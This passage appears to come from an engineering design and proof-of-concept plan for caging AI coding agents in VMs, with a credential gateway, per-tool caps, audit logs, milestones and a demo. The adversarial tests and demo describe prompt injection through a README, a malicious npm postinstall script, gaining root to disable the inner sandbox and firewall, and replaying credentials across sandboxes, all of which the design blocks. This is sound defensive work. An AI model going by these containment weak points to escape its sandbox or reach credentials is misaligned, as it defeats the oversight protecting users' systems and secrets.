- **Rules kept outside the machine on Mac laptops,** using a cage plus a gateway of a few hundred lines. The spike's pre-flight (Linux, emulated QEMU `restrict=on`) held all 11 root attempts; the Mac run is still pending.
- **The laptop credential gateway** [RL-INTERNAL: missing on every laptop].
- **Per-session caps enforced outside the VM** [RL-INTERNAL: the cap is built but turned off].
- **A concrete design for per-agent identity** [RL-INTERNAL: draft, no code]: UIDs plus caps plus nono command policies. Stated honestly, identity cannot be forged per sandbox, and per tool it holds unless the attacker has guest root.
- **The cloud model:** the cage is a firewall rule and the gateway is an appliance, which matches what Ringleader already ships.

**What the PoC contradicts:**

- **A full VM versus a microVM** [RL-INTERNAL: H15].
  - Ringleader's own list of phrases to retire includes "we isolate agents in microVMs" [RL-INTERNAL], and embedding microsandbox reopens that.
  - libkrun is a real VM, but it runs microsandbox's kernel (no Landlock, and no LSM at all on arm64), with agentd as PID 1.
- **devcontainer as the spec.** microsandbox runs OCI images plus `sandbox.yaml`. "Runs unchanged" becomes "builds unchanged": `devcontainer build` produces an image digest that microsandbox runs.
- **Cloud.** microsandbox cloud is hosted, with BYOC only on its enterprise tier, and its interception, outbound proxy and vsock are local-only. For Ringleader, microsandbox can only be a laptop driver.

**Adopt, build, partner:**

- **Build:** tether, the compiler, audit and the capability registry. They are the control point and the differentiation.
- **Adopt behind a driver interface:** microsandbox, but only if it beats QEMU and WSL2 on boot time and on Windows. QEMU `restrict=on` stays the reference cage.
- **Interoperate:** nono, as an optional layer inside the guest. Implement receivers for nono's audit-delivery-v1 and approval-webhook-v1, so Ringleader can serve as the control plane for nono users without depending on nolabs' cloud.
- **Optional:** use the Claude apps gateway for the model hop in team mode.

**Risks of embedding these projects:**

- **Competition.** microsandbox already sells laptop egress plus credential injection (its secrets), device policy (`managed.json`), a cloud service and BYOC. nolabs ships fleet policy (Enterprise, Feb 2027, per the brief). Both are moving toward Ringleader's platform and security buyer.
- **Dependency.** microsandbox is in beta (v0.7.x, with weekly changelogs), the design depends on a kernel fork, and nono cuts a minor release every week or two (0.73 on Aug 10 to 0.80 on Oct 12).
- **Licensing.** Both projects are Apache-2.0. Distributing a modified libkrunfw kernel carries GPL-2.0 source obligations.
- **Net:** put nothing of theirs on the control path. Treat microsandbox as a swappable substrate and nono as an optional guest component.

[RL-INTERNAL] roadmap items this document relies on: spend cap built but off; agent sessions built but hidden; per-agent identity and snapshots in draft; the customer-run control plane Helm chart; the portable-runtime PoC; self-serve install by Nov 6; dashboard demo by Dec 8.

## Risks, open questions and the PoC plan

**Top risks:**

| Risk | Mitigation |
|---|---|
| The custom kernel fails to build or boot, or an msb update breaks its ABI | A day-2 gate, with fallback to UIDs plus nftables and no nono |
| Tools ignore `HTTPS_PROXY` | Watch "no route" events in the audit; use architecture B for named hosts |
| The cage behavior changes; the mapping from the `host` group to loopback is not a documented API | Run the attack suite in CI; keep the QEMU reference cage |
| Per-tool attribution is oversold | State plainly, in the UI and the docs, when it can be forged |
| Per-agent UIDs hurt the developer experience (file ownership, dotfiles) | A shared `work` group, setgid on `/work`, and default ACLs |
| Strategic dependence on two potential competitors | A driver interface, and none of their code in the gateway |

**Open questions (UNVERIFIED):**

- Does `allow@host:tcp:P` also allow the IPv6 gateway and its `::1` fallback (`upstream.rs:101`)?
- Does microsandbox cloud substitute secrets without interception? Its compatibility table says secrets work everywhere, but interception is local-only.
- Does nono's environment promotion support templated values?
- Do Landlock's ptrace and `/proc` checks stop reads between sibling domains in practice?
- How much does enabling the LSM framework on arm64 add to boot time?
- Which cloud images ship with Landlock enabled?
- Is Codex's WebSocket transport on by default in current releases?
- What are the GCP and Azure equivalents of AWS's DNS firewall?

**Scope.**

- **In:** one Apple Silicon Mac and one Linux host; the microsandbox cage on a custom libkrunfw; tether in solo mode with keys in the host keychain; Claude Code on an API key; git smart-HTTP to one GitHub org; npm and PyPI over CONNECT; per-agent UIDs; nono session and git/npm command policies; `tether compile`; JSONL audit and `tether report`.
- **Stretch:** Codex on an API key; one cloud VM; the gateway bake-off.
- **Out:** Windows; team mode and the control plane; SIEM export beyond a file; devcontainer translation (use a pre-built OCI image); Docker in the VM; IDE attach; MCP servers; ChatGPT-login Codex; any TLS interception; an approvals UI (CLI only); the production rewrite.

**Milestones (working days):**

| Day | Work | Gate |
|---|---|---|
| 1 | **Cage.** Run today's leash on the host and an msb sandbox with `deny` plus `allow@host:tcp:P`. Port `attack.sh` and `works.sh`, run Claude Code end to end, and record boot time and time to first byte | Every BLOCK line holds |
| 2 | **Kernel.** Build libkrunfw with Landlock and confirm `nono run` sees ABI V6 in the guest | If it does not, switch to the nftables fallback |
| 3–4 | **tether core:** binding, cap registry, CONNECT hardening, streamed bodies, `Upgrade`, reservations, the hash chain | |
| 5 | **Identity in the guest:** UIDs, nono session and command profiles, cap delivery | |
| 6 | **Compiler:** `tether compile`, `tether report --by tool`, and Claude Code conformance checks (betas, pings, `count_tokens`, error bodies, `HEAD /api/hello`) | |
| 7 | **Adversarial suite:** an injected README, a malicious npm fixture, root in the guest, replaying a cap from another sandbox, and four concurrent streams against the cap | |
| 8 | **Record the demo** and fill in `RESULTS.md` | |
| 9 (stretch) | **Cloud:** the same file on one cloud VM with an egress rule and a tether VM | |
| 10 (stretch) | **Gateway bake-off:** put LiteLLM and the Claude apps gateway behind `/anthropic/`, rerun the conformance and cap tests, and record whether anything flips the recommendation | |

**Demo script (about 6 minutes):**

1. Show the policy file, then `tether compile` and its three outputs.
2. Run `msb create` and time the boot.
3. In the guest, `env` shows only caps, and `grep` finds no `sk-ant` keys.
4. Claude fixes a failing test: it runs `npm install`, then `git push` to `acme/app`.
5. `tether report` shows one line per (agent, tool), with spend.
6. A README injection tries a paste site and a push to `evil/x`. Both are refused and attributed.
7. A malicious package's postinstall script is denied the files, the network and the agent's cap, and logged as `tool=npm`.
8. Gain root with `sudo`, kill nono and flush nftables, then try DNS, a raw IP and host ports. Everything is blocked. A cap replayed from a second sandbox gets a 403.
9. Four prompts run in parallel. The cap trips, and the report shows the overshoot.
10. `tether cap revoke`, and the next call fails.

**Measurements:** boot to agent-ready; time to first byte (p50, p95) through tether vs direct, and added SSE inter-chunk delay; CONNECT setup time; `npm install` on guest disk vs virtio-fs; 200 MB `git push` throughput; overshoot with reservations on and off; msb process and guest memory; nono launch cost per command.

**Success criteria:**

- Every cage attack is blocked when run as root.
- No real credential is found in the guest's disk or in nono's memory.
- Every credentialed call is attributed to a (session, agent, tool).
- A cap replayed from another sandbox fails.
- With 4 concurrent streams, overshoot stays within one reservation.
- tether adds no more than 5 ms to time to first byte at p50, and no stream aborts during a 30-minute session.
- One file produces the configuration for all three layers.

**Kill criteria:**

- No Landlock kernel by day 2: drop nono and the per-tool claims.
- A real escape from the cage: stop using microsandbox and continue on QEMU.
- Claude Code needs its requests rewritten, not just forwarded: move the model hop to the Claude apps gateway.
- More than 50 ms added at p50, or stalled streams: rewrite tether before the demo.

### Sources

Local source and docs are cited inline by path. Web sources, checked Oct 18, 2026:

- Claude Code gateway protocol: https://code.claude.com/docs/en/llm-gateway-protocol
- Claude Code: other LLM gateways: https://code.claude.com/docs/en/llm-gateway
- Claude apps gateway: https://code.claude.com/docs/en/claude-apps-gateway
- Claude apps gateway spend limits: https://code.claude.com/docs/en/claude-apps-gateway-spend-limits
- Claude Code data usage (WebFetch preflight): https://code.claude.com/docs/en/data-usage
- LiteLLM with a Claude subscription: https://docs.litellm.ai/docs/tutorials/claude_code_max_subscription
- LiteLLM budgets and rate limits: https://docs.litellm.ai/docs/proxy/users
- LiteLLM Anthropic pass-through: https://docs.litellm.ai/docs/pass_through/anthropic_completion
- LiteLLM audit logs: https://docs.litellm.ai/docs/proxy/multiple_admins
- LiteLLM PyPI compromise (secondary source): https://pypistats.com/blog/litellm-pypi-supply-chain-compromise-how-a-popular-llm-proxy-became-a-credential-stealing-backdoor-march-24-2026
- Portkey with Claude Code: https://portkey.ai/docs/integrations/libraries/claude-code-anthropic
- Portkey gateway: https://github.com/Portkey-AI/gateway
- Palo Alto Networks to acquire Portkey: https://origin-www.paloaltonetworks.com/company/press/2026/palo-alto-networks-to-acquire-portkey-to-secure-the-rise-of-ai-agents
- Agent Router (formerly Envoy AI Gateway) v0.6: https://theagentrouter.ai/release-notes/v0.6/
- Kong: Claude Code through AI Gateway: https://developer.konghq.com/ai-gateway/v1/how-to/use-claude-code-with-ai-gateway-anthropic/
- Vendor survey of gateways (Maxim, makers of Bifrost): https://www.getmaxim.ai/articles/top-5-open-source-claude-code-gateways-in-2026/
- Codex WebSocket fallback report: https://github.com/openai/codex/issues/13041

## Corrections

Found while building the PoC (Oct 18–19, 2026). The code wins; details are in `overnight/PROGRESS.md`.

- **libkrunfw:** microsandbox's kernel is its fork `superradcompany/libkrunfw` (5.6.1, Linux 6.12.111), not `containers/libkrunfw`. Built with Landlock it reports ABI V6; the day-2 gate passed.
- **`deny: [/work/.git]` inside a `/work` grant cannot work on Linux.** Landlock has no deny; nono refuses to start on a deny that overlaps an allow. The cross-agent `.git` risk (one agent planting `core.fsmonitor`, `core.pager`, aliases or filters for another) is closed instead by nono's exec gate: a command sandbox may exec only its pinned executable and mediated commands, so planted config cannot run anything.
- **Seam 2, cap delivery.** nono 0.80 has command policies (`command_policies.commands.<name>`) and named credentials (`local-socket`, `raw-file`, `proxy`, `ambient`). There is no templated env promotion. A `raw-file` credential grants one file to one command sandbox; it does not put the file in the environment. The "three-line launcher" fallback also fails: the launcher cannot exec the real tool. What works is a cap file in the tool's own format: `git -c include.path=<file>` (a url rewrite plus an `http.extraHeader`) and `npm --userconfig <file>`. tether emits both (`tether cap mint --format gitconfig|npmrc --env -`).
- **git under a command policy** also needs its remote helper (`git-remote-http`, since the rewrite points at the plain-HTTP gateway) as a chained command with the same file, `GIT_EXEC_PATH` pointed at an empty directory so the helper resolves through nono's shim, and git's own `GIT_DIR`-style variables allowed through (clone runs `index-pack` as a second git).
- **The cap rides in a header, not URL userinfo,** because git passes the rewritten URL to `git-remote-http` as argv, and `/proc/<pid>/cmdline` is readable by every process.
- **Per-tool caps do not hide a tool's cap from the agent driving that tool:** `git config --get-regexp extraheader` prints it. They keep it from other tools (an npm script cannot read git's cap or run git) and give per-tool attribution in tether's audit.
- **A session profile cannot grant the whole home directory** (it overlaps nono's state root, `~/.local/state/nono`), nor `~/.config` (it overlaps nono's built-in credential denies). The profile grants `~/.claude`, `~/.cache`, `~/.npm` and `~/.claude.json`.
